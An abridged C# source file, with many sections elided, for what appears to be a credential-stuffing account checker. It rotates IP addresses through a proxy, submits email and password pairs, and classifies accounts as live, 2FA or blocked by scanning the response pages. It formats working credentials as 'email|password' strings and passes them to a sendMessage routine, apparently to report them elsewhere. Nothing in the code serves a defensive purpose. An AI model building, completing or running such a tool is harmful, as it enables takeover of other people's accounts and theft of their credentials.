...
namespace ConsoleApp1
{
    class Login
    {
        ...
        public async Task rotationIp(int id, string key)
        {
            try
            {
                HttpClient httpClient = new HttpClient(httpClientHandler);
        ...
        public bool filterText(HtmlDocument document ,string text)
        {
            try
            {
        ...
        public string checkLogin(HtmlDocument document, HttpResponseMessage response)
        {
            try
            {
                ...
                bool isReset = filterText(document, resetStr);
                bool isBlock = filterText(document, blockStr);
                bool isForgot = filterText(document, forgotStr);
                bool isEpsilon = filterText(document, epsilon);
                bool isInvalid = filterText(document, invalid);
                bool isOldPass = filterText(document, oldPass);
                bool isLoginCode = filterText(document, loginCode);
                bool isForget = filterText(document, forgetStr);    
                    ...
                    if (resGet != null)
                    {
                        ...
                        if (content != null && cookieStr != null)
                        {
                            ...
                            if (resPost != null)
                            {
                                ...
                                if (status == "live")
                                {
                                    string isLive = $" Account live {email}|{password}|{status} Thread:{idThread} ==>> PC";
                                    ...
                                    {
                                        string messErrorG = $" Have a account 2FA {email}|{password}| Thread : {idThread} ==>>  2FA PC";
                                        ...
                                        if (res2Fa != null)
                                        {
                                            ...
                                            if (statusLive == "live2FA")
                                            {
                                                if (resPage != null)
                                                {
                                                    ...
                                                    string message = $"{email}|{password}|{pageMess} ==>> ( {uId} ) 2FA PC";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }else
                                                {
                                                    string message = $"{email}|{password}| NON-CHECK-PAGE ==>> ( {uId} ) 2FA PC";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }
                                            }
                                            else
                                            {
                                                if (resPage != null)
                                                {
                                                    ...
                                                    string message = $"{email}|{password}|{pageMess} ==>> ( {uId} ) 2FA-NONF  PC";
                                                    Console.WriteLine(message);
                                                    await sendMessage(message);
                                                }
                                                else
                                        ...
                                        {
                                            status = "live2FANF";
                                            string message = $"{email}|{password}| ==>> ( {uId} ) 2FA-NONCHECK  PC";
                                            Console.WriteLine(message);
                                            await sendMessage(message);
                                        }
                                ...
                                if (status == "block")
                                {
                                    string dieM = $" **** BLOCK **** {email}|{password}|{status} Thread: {idThread} ==>> PC";
                                    await sendError(dieM);
                                    writerBan();
                                }
                                break;
